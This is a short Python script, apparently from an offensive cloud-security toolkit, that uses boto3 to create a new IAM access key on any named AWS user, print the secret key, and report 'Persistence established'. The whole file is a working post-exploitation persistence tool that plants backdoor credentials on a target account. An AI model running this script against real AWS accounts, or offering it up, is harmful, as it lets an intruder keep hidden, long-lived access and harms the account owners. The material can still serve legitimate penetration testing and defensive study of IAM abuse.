"""
What it does:
  - Takes a target username as argument
  - Creates a new access key on that user
  - Returns AccessKeyId and SecretAccessKey
  - Can be used on any user including yourself
"""

import boto3
import botocore
import sys

def create_access_key(username):
    try:
        iam = boto3.client('iam')

        print(f"\n[i] Target user : {username}")

        # Check existing keys first
        existing = iam.list_access_keys(
            UserName=username
        )['AccessKeyMetadata']

        print(f"[i] Existing keys: {len(existing)}/2")
        for key in existing:
            print(f"    - {key['AccessKeyId']} ({key['Status']})")

        if len(existing) >= 2:
            print(f"\n[x] Cannot create key — user already has 2 keys (AWS limit)")
            print(f"[i] Delete an existing key first:")
            print(f"    aws iam delete-access-key --user-name {username} --access-key-id <key-id>")
            return

        # Create new access key
        response = iam.create_access_key(UserName=username)
        new_key  = response['AccessKey']

        print(f"\n[+] New access key created successfully")
        print(f"\n[!] SAVE THESE NOW — SecretAccessKey shown only once:")
        print(f"    AccessKeyId     : {new_key['AccessKeyId']}")
        print(f"    SecretAccessKey : {new_key['SecretAccessKey']}")
        print(f"    Status          : {new_key['Status']}")
        print(f"    Created         : {new_key['CreateDate']}")

        print(f"\n[i] Use these credentials:")
        print(f"    aws configure")
        print(f"    → AccessKeyId     : {new_key['AccessKeyId']}")
        print(f"    → SecretAccessKey : {new_key['SecretAccessKey']}")

        print(f"\n[+] Persistence established on user: {username}")
        print(f"[i] These credentials remain valid until manually deleted")

    except botocore.exceptions.ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDenied':
            print(f"[x] AccessDenied — need iam:CreateAccessKey permission")
        elif code == 'NoSuchEntity':
            print(f"[x] User not found: {username}")
        elif code == 'LimitExceeded':
            print(f"[x] Key limit reached — user already has 2 active keys")
        else:
            print(f"[x] Error {code}: {e}")
    except botocore.exceptions.NoCredentialsError:
        print("[x] No credentials — run: aws configure")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("\n[!] Usage: python3 create_access_key.py <username>")
        print("    Example: python3 create_access_key.py omar")
        sys.exit(1)

    username = sys.argv[1]
    create_access_key(username)
